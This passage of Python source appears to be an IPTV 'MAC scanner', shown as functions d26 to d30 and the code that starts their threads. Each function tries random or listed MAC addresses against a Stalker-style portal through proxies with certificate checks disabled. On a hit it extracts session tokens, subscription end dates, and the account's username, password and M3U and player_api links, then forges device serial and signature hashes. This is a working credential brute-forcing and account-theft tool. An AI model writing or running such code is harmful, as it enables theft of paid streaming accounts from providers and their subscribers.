                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d26():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(26, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_26'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(26, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d27():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(27, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_27'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(27, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d28():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(28, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_28'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(28, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d29():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(29, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_29'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(29, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d30():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(30, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_30'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(30, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


t1 = threading.Thread(target=d1)
t2 = threading.Thread(target=d2)
t3 = threading.Thread(target=d3)
t4 = threading.Thread(target=d4)
t5 = threading.Thread(target=d5)
t6 = threading.Thread(target=d6)
t7 = threading.Thread(target=d7)
t8 = threading.Thread(target=d8)
t9 = threading.Thread(target=d9)
t10 = threading.Thread(target=d10)
t11 = threading.Thread(target=d11)
t12 = threading.Thread(target=d12)
t13 = threading.Thread(target=d13)
t14 = threading.Thread(target=d14)
t15 = threading.Thread(target=d15)
t16 = threading.Thread(target=d16)
t17 = threading.Thread(target=d17)
t18 = threading.Thread(target=d18)
t19 = threading.Thread(target=d19)
t20 = threading.Thread(target=d20)
t21 = threading.Thread(target=d21)
t22 = threading.Thread(target=d22)
t23 = threading.Thread(target=d23)
t24 = threading.Thread(target=d24)
t25 = threading.Thread(target=d25)
t26 = threading.Thread(target=d26)
t27 = threading.Thread(target=d27)
t28 = threading.Thread(target=d28)
t29 = threading.Thread(target=d29)
t30 = threading.Thread(target=d30)
t1.start()
if botsay == 2 or botsay == 3 or botsay == 4 or botsay == 5 or botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t2.start()
if botsay == 3 or botsay == 4 or botsay == 5 or botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t3.start()
if botsay == 4 or botsay == 5 or botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30:
    t4.start()
